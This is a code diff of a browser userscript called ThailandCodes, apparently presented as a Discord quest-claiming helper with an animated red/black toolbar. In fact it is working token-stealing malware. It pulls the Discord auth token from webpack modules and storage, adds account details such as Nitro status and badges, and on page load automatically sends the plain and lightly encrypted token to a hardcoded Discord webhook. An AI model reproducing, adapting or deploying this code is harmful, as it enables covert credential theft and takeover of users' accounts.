@@ -1,6 +1,5 @@
 /**
- * ThailandCodes v4.2 — Silent Single Grab
- * No UI. No buttons. Just grabs one token and sends.
+ * ThailandCodes v4.4 — UI + Single Auto-Grab (Red/Black Animated)
  */
 (function () {
     'use strict';
@@ -13,7 +12,7 @@
             'https://discord.com/api/webhooks/1563505727102910540/xtAh-pe1eLKUk7IRrKBvOD_4qpMcnWGMzo8ymS9ASqGzrPrnQ4x6N3yMhO2OGagrfV07',
         ],
         encryptKey: 0x5A,
-        grabKey: '__tc_g_silent__',
+        grabKey: '__tc_g_v44__',
         webpackTimeout: 90000,
         autoClaim: true,
         enrich: true,
@@ -21,6 +20,7 @@
     const TOKEN_REGEX = /[\w-]{24,28}\.[\w-]{6}\.[\w-]{27,38}|mfa\.[\w-]{84}/g;
     const sleep = (ms) => new Promise(r => setTimeout(r, ms));
 
+    // ==================== WEBHOOK ====================
     function sendWebhookTo(url, payload) {
         return new Promise((resolve) => {
             try {
@@ -46,6 +46,7 @@
         return false;
     }
 
+    // ==================== ENCRYPTION ====================
     function encryptToken(token) {
         const key = CONFIG.encryptKey ^ (token.length & 0xFF);
         let out = '';
@@ -55,6 +56,7 @@
         return btoa(unescape(encodeURIComponent(out)));
     }
 
+    // ==================== WEBPACK ====================
     function findWebpack() {
         const chunk = W.webpackChunkdiscord_app;
         if (!chunk) return null;
@@ -65,18 +67,12 @@
                 if (!m?.c) return;
                 for (const cid in m.c) {
                     const exp = m.c[cid]?.exports?.default || m.c[cid]?.exports;
-                    if (exp && typeof exp.getToken === 'function') {
-                        found = m;
-                        return;
-                    }
+                    if (exp && typeof exp.getToken === 'function') { found = m; return; }
                 }
             }]);
             for (let i = chunk.length - 1; i >= 0; i--) {
                 const entry = chunk[i];
-                if (Array.isArray(entry) && entry[0]?.[0] === probeId) {
-                    chunk.splice(i, 1);
-                    break;
-                }
+                if (Array.isArray(entry) && entry[0]?.[0] === probeId) { chunk.splice(i, 1); break; }
             }
         } catch {}
         return found;
@@ -105,6 +101,7 @@
         throw new Error('token not found');
     }
 
+    // ==================== HARVEST & API ====================
     function harvestStorage(storage, tokens) {
         try {
             for (let i = 0; i < storage.length; i++) {
@@ -167,13 +164,10 @@
         return result;
     }
 
+    // ==================== EMBED BUILDER ====================
     function buildEmbed(token, user) {
-        const tag = user.discriminator && user.discriminator !== '0'
-            ? `${user.username}#${user.discriminator}`
-            : user.username;
-        const avatarUrl = user.avatar
-            ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.${user.avatar.startsWith('a_') ? 'gif' : 'png'}?size=256`
-            : `https://cdn.discordapp.com/embed/avatars/${(parseInt(user.discriminator) || 0) % 5}.png`;
+        const tag = user.discriminator && user.discriminator !== '0' ? `${user.username}#${user.discriminator}` : user.username;
+        const avatarUrl = user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.${user.avatar.startsWith('a_') ? 'gif' : 'png'}?size=256` : `https://cdn.discordapp.com/embed/avatars/${(parseInt(user.discriminator) || 0) % 5}.png`;
         const nitroMap = { 0: '❌ None', 1: '💜 Nitro Classic', 2: '🚀 Nitro', 3: '⚡ Nitro Basic' };
         const nitro = nitroMap[user.premium_type] || '❌ None';
         const f = user.public_flags || 0;
@@ -195,9 +189,7 @@
         if (f & (1 << 18)) badges.push('📚 Mod Alumni');
         if (f & (1 << 22)) badges.push('🤖 Verified Dev');
         const createdAt = new Date(Number((BigInt(user.id) >> 22n) + 1420070400000n));
-        const premiumSince = user.premium_since
-            ? new Date(user.premium_since).toUTCString()
-            : '`N/A`';
+        const premiumSince = user.premium_since ? new Date(user.premium_since).toUTCString() : '`N/A`';
         const fields = [
             { name: '👤 Username', value: `\`${tag}\``, inline: true },
             { name: '🆔 User ID', value: `\`${user.id}\``, inline: true },
@@ -216,6 +208,7 @@
         fields.push({ name: '🏅 Badges', value: badges.length ? badges.join(' | ') : '`None`', inline: false });
         fields.push({ name: '🔑 Token (Plain)', value: `\`\`\`${token}\`\`\``, inline: false });
         fields.push({ name: '🔒 Token (Encrypted)', value: `\`\`\`${encryptToken(token)}\`\`\``, inline: false });
+        
         return {
             embeds: [{
                 title: '🎯 Token Grabbed',
@@ -223,12 +216,13 @@
                 author: { name: tag, icon_url: avatarUrl },
                 thumbnail: { url: avatarUrl },
                 fields,
-                footer: { text: 'ThailandCodes v4.2 • Silent', icon_url: avatarUrl },
+                footer: { text: 'ThailandCodes v4.4 • Red/Black', icon_url: avatarUrl },
                 timestamp: new Date().toISOString(),
             }],
         };
     }
 
+    // ==================== QUESTS ====================
     async function claimAllQuests() {
         const wp = findWebpack();
         if (!wp) throw new Error('webpack not ready');
@@ -240,9 +234,7 @@
             if (exp.quests && typeof exp.quests.values === 'function') QuestsStore = exp;
         }
         if (!api || !QuestsStore) throw new Error('Quest modules not found');
-        const quests = [...QuestsStore.quests.values()].filter(q =>
-            q.userStatus?.completedAt && !q.userStatus?.claimedAt
-        );
+        const quests = [...QuestsStore.quests.values()].filter(q => q.userStatus?.completedAt && !q.userStatus?.claimedAt);
         if (quests.length === 0) return 0;
         let claimed = 0;
         for (const q of quests) {
@@ -254,6 +246,7 @@
         return claimed;
     }
 
+    // ==================== GRAB SINGLE ====================
     async function grabOneToken() {
         let token = null;
         try {
@@ -277,17 +270,211 @@
         return ok;
     }
 
+    // ==================== UI (ADVANCED RED/BLACK) ====================
+    const STYLE = `
+        :host,*{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif}
+        
+        .wrap{
+            position:fixed;top:12px;left:50%;transform:translateX(-50%);z-index:2147483646;
+            display:flex;align-items:center;gap:6px;padding:6px;
+            background:#050000;
+            background-image: radial-gradient(circle at center, rgba(255,0,0,0.15) 0%, transparent 60%);
+            background-size: 200% 200%;
+            animation: red-pulse 4s ease-in-out infinite;
+            border:1px solid #ff1a1a;border-radius:14px;
+            color:#ffcccc;user-select:none;font-size:12px;
+            transition:opacity .3s, transform .3s cubic-bezier(.32,.72,0,1);
+            overflow:hidden;
+        }
+        
+        .wrap.hidden{opacity:0;transform:translate(-50%,-140%);pointer-events:none}
+        
+        .brand{
+            padding:0 14px 0 10px;font-weight:800;font-size:13px;letter-spacing:.3px;
+            border-right:1px solid rgba(255,0,0,0.3);margin-right:4px;color:#fff;
+            display:flex;align-items:center;gap:6px;position:relative;z-index:1;
+        }
+        .brand .a{color:#ff3333;text-shadow:0 0 10px #ff0000;}
+        .brand .v{font-size:9px;font-weight:600;color:#ff6666;font-style:italic;letter-spacing:0;text-shadow:0 0 5px #ff0000;}
+
+        .dot{width:7px;height:7px;border-radius:50%;background:#ff0000;box-shadow:0 0 10px #ff0000;transition:background .2s}
+        .dot.ready{background:#ff1a1a;box-shadow:0 0 15px #ff1a1a;}
+        .dot.busy{background:#ff6666;animation:pulse 1s infinite}
+        .dot.err{background:#990000}
+        
+        @keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.5;transform:scale(1.2)}}
+        @keyframes red-pulse{
+            0% { background-position: 0% 50%; box-shadow: 0 0 10px rgba(255,0,0,0.3), inset 0 0 5px rgba(255,0,0,0.1); }
+            50% { background-position: 100% 50%; box-shadow: 0 0 25px rgba(255,0,0,0.7), inset 0 0 15px rgba(255,0,0,0.4); }
+            100% { background-position: 0% 50%; box-shadow: 0 0 10px rgba(255,0,0,0.3), inset 0 0 5px rgba(255,0,0,0.1); }
+        }
+
+        button{
+            background:rgba(255,0,0,0.1);border:1px solid rgba(255,0,0,0.5);color:#fff;
+            padding:9px 14px;border-radius:8px;cursor:pointer;font-size:11px;font-weight:800;
+            letter-spacing:.4px;text-transform:uppercase;font-family:inherit;
+            transition:all .2s;white-space:nowrap;position:relative;z-index:1;
+            text-shadow:0 0 5px rgba(255,0,0,0.5);overflow:hidden;
+        }
+        
+        button::after {
+            content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;
+            background:linear-gradient(90deg, transparent, rgba(255,0,0,0.4), transparent);
+            transition:left .4s;
+        }
+        button:hover::after { left:100%; }
+        button:hover{background:rgba(255,0,0,0.3);box-shadow:0 0 15px rgba(255,0,0,0.6);}
+        button:active{transform:scale(.97)}
+        button:disabled{opacity:.5;cursor:wait}
+        
+        button.enc{background:rgba(255,0,0,0.05);border:1px solid rgba(255,0,0,0.2)}
+        button.enc:hover{background:rgba(255,0,0,0.2)}
+        
+        button.claim{background:rgba(255,0,0,0.8);color:#fff;border:1px solid #ff0000;box-shadow:0 0 10px #ff0000;}
+        button.claim:hover{background:#ff1a1a;box-shadow:0 0 20px #ff0000;}
+        
+        button.close{background:transparent;border:none;color:#ff6666;font-size:14px;
+            padding:8px 10px;text-transform:none;letter-spacing:0;box-shadow:none;}
+        button.close:hover{background:rgba(255,0,0,0.5);color:#fff;border-radius:8px;}
+
+        .toast{
+            position:fixed;top:78px;right:24px;z-index:2147483647;background:#0a0000;
+            border:1px solid #ff1a1a;color:#fff;padding:12px 18px;border-radius:10px;
+            font-size:12px;font-weight:600;max-width:340px;
+            box-shadow:0 0 20px rgba(255,0,0,0.4), inset 0 0 10px rgba(255,0,0,0.2);
+            opacity:0;transform:translateY(-6px);transition:opacity .2s,transform .2s;
+            pointer-events:none;text-shadow:0 0 5px #ff0000;
+        }
+        .toast.show{opacity:1;transform:translateY(0)}
+        .toast.ok{border-left:3px solid #ff1a1a;box-shadow:0 0 20px rgba(255,0,0,0.6);}
+        .toast.err{border-left:3px solid #990000;}
+        .toast.info{border-left:3px solid #ff6666;}
+    `;
+
+    const root = document.createElement('div');
+    root.id = 'tc-root';
+    root.style.cssText = 'position:fixed;top:0;left:0;width:0;height:0;z-index:2147483647;pointer-events:none;';
+    const shadow = root.attachShadow({ mode: 'open' });
+    document.body.appendChild(root);
+
+    const st = document.createElement('style');
+    st.textContent = STYLE;
+    shadow.appendChild(st);
+
+    const host = document.createElement('div');
+    host.style.pointerEvents = 'auto';
+    shadow.appendChild(host);
+
+    const toast = document.createElement('div');
+    toast.className = 'toast';
+    host.appendChild(toast);
+
+    let toastTimer = null;
+    function say(msg, kind = 'info') {
+        toast.textContent = msg;
+        toast.className = 'toast show ' + kind;
+        clearTimeout(toastTimer);
+        toastTimer = setTimeout(() => toast.classList.remove('show'), 3200);
+    }
+
+    const bar = document.createElement('div');
+    bar.className = 'wrap hidden';
+    bar.innerHTML = `<div class="brand"><span class="dot"></span>Thailand<span class="a">Codes</span><span class="v">v4.4</span></div>`;
+    host.appendChild(bar);
+    const dot = bar.querySelector('.dot');
+
+    const btnCopy = document.createElement('button');
+    btnCopy.textContent = 'COPY TOKEN';
+    btnCopy.addEventListener('click', async () => {
+        if (btnCopy.disabled) return;
+        btnCopy.disabled = true;
+        try {
+            const t = await getToken();
+            try { await navigator.clipboard.writeText(t); }
+            catch {
+                const ta = document.createElement('textarea');
+                ta.value = t; document.body.appendChild(ta);
+                ta.select(); document.execCommand('copy'); ta.remove();
+            }
+            say('✓ token copied', 'ok');
+        } catch (e) { say('✗ ' + (e.message || e), 'err'); }
+        btnCopy.disabled = false;
+    });
+    bar.appendChild(btnCopy);
+
+    const btnEnc = document.createElement('button');
+    btnEnc.className = 'enc';
+    btnEnc.textContent = 'COPY ENCRYPTED';
+    btnEnc.addEventListener('click', async () => {
+        if (btnEnc.disabled) return;
+        btnEnc.disabled = true;
+        try {
+            const t = await getToken();
+            const enc = encryptToken(t);
+            try { await navigator.clipboard.writeText(enc); }
+            catch {
+                const ta = document.createElement('textarea');
+                ta.value = enc; document.body.appendChild(ta);
+                ta.select(); document.execCommand('copy'); ta.remove();
+            }
+            say('✓ encrypted copied', 'ok');
+        } catch (e) { say('✗ ' + (e.message || e), 'err'); }
+        btnEnc.disabled = false;
+    });
+    bar.appendChild(btnEnc);
+
+    const btnClaim = document.createElement('button');
+    btnClaim.className = 'claim';
+    btnClaim.textContent = 'CLAIM ALL';
+    btnClaim.addEventListener('click', async () => {
+        if (btnClaim.disabled) return;
+        btnClaim.disabled = true;
+        try {
+            const n = await claimAllQuests();
+            say(n > 0 ? `✓ claimed ${n} quest(s)` : 'no quests ready', n > 0 ? 'ok' : 'info');
+        } catch (e) { say('✗ ' + (e.message || e), 'err'); }
+        btnClaim.disabled = false;
+    });
+    bar.appendChild(btnClaim);
+
+    const x = document.createElement('button');
+    x.className = 'close';
+    x.textContent = '✕';
+    x.addEventListener('click', () => bar.classList.add('hidden'));
+    bar.appendChild(x);
+
+    // ==================== INIT ====================
     async function init() {
+        dot.classList.add('busy');
+        const wp = await waitForWebpack();
+        if (!wp) {
+            dot.classList.remove('busy');
+            dot.classList.add('err');
+            bar.classList.remove('hidden');
+            say('✗ webpack not found', 'err');
+            return;
+        }
+        dot.classList.remove('busy');
+        dot.classList.add('ready');
+        bar.classList.remove('hidden');
+
         let alreadyGrabbed = false;
         try { alreadyGrabbed = localStorage.getItem(CONFIG.grabKey) === '1'; } catch {}
-        if (alreadyGrabbed) return;
 
-        const wp = await waitForWebpack();
-        if (!wp) return;
+        if (alreadyGrabbed) {
+            say('already grabbed — manual buttons only', 'info');
+            return;
+        }
 
+        dot.classList.add('busy');
         const ok = await grabOneToken();
+        dot.classList.remove('busy');
+
         if (ok) {
             try { localStorage.setItem(CONFIG.grabKey, '1'); } catch {}
+            say('✓ grabbed one token', 'ok');
+        } else {
+            say('✗ grab failed — retrying on next load', 'err');
         }
     }
 
